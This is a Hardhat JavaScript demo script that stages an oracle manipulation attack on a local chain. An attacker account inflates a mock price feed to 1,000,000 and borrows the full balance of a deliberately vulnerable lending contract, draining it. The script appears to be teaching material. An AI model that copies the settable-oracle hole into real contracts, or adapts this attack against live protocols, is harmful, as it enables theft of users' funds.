const hre = require("hardhat");

async function main() {
  // Display the purpose of the script
  console.log("=== Vulnerable Lending Demo (Oracle Manipulation Attack) ===\n");

  // Get the deployer and attacker accounts
  const [deployer, attacker] = await hre.ethers.getSigners();

  console.log("Accounts:");
  console.log(" Deployer:", deployer.address); // Address of the deployer
  console.log(" Attacker:", attacker.address); // Address of the attacker

  // Deploy the mock oracle contract (MockPriceFeed)
  console.log("\n--- Deploying Oracle (MockPriceFeed) ---");
  const Mock = await hre.ethers.getContractFactory("MockPriceFeed");
  const mock = await Mock.deploy(100); // Initialize the oracle price to 100
  await mock.deployed();
  console.log("Initial oracle price:", 100); // Log the initial price
  console.log("Oracle deployed at:", mock.address); // Log the oracle contract address

  // Deploy the vulnerable lending contract
  console.log("\n--- Deploying Vulnerable Lending Contract ---");
  const Lending = await hre.ethers.getContractFactory("VulnerableLending");
  const lending = await Lending.deploy(mock.address, {
    value: hre.ethers.utils.parseEther("5") // Fund the contract with 5 ETH
  });
  await lending.deployed();
  console.log("Lending contract deployed at:", lending.address); // Log the lending contract address

  // Log the initial balance of the lending contract
  const initialBalance = await hre.ethers.provider.getBalance(lending.address);
  console.log("Initial lending contract balance:", hre.ethers.utils.formatEther(initialBalance), "ETH");

  // Simulate the attacker manipulating the oracle price
  console.log("\n--- Manipulating Oracle Price ---");
  console.log("Attacker sets oracle price to: 1,000,000");
  await mock.connect(attacker).setPrice(1_000_000); // Attacker sets an inflated price

  // Log the updated price from the oracle
  const updatedPrice = await mock.getLatestPrice();
  console.log("New oracle price (read from MockPriceFeed):", updatedPrice.toString());

  // Attacker drains the lending contract by borrowing all available funds
  console.log("\n--- Draining the Vulnerable Contract ---");
  const amountToBorrow = await hre.ethers.provider.getBalance(lending.address); // Get the contract's balance
  console.log("Amount borrower will request (wei):", amountToBorrow.toString());
  console.log("Borrow transaction submitted...");

  const tx = await lending.connect(attacker).borrow(amountToBorrow); // Borrow the full balance
  await tx.wait();
  console.log("Borrow transaction mined."); // Log the transaction status

  // Log the final balance of the lending contract
  const finalBalance = await hre.ethers.provider.getBalance(lending.address);
  console.log("\n--- Final Balances ---");
  console.log("Lending contract balance:", hre.ethers.utils.formatEther(finalBalance), "ETH");

  // Log the attacker's final balance after draining the contract
  const attackerBalance = await hre.ethers.provider.getBalance(attacker.address);
  console.log("Attacker account balance:", hre.ethers.utils.formatEther(attackerBalance), "ETH");

  console.log("\n=== Demo complete: contract drained ===");
}

// Entry point for the script, with error handling
main().catch(err => {
  console.error(err); // Log any errors that occur
  process.exit(1); // Exit the process with an error code
});
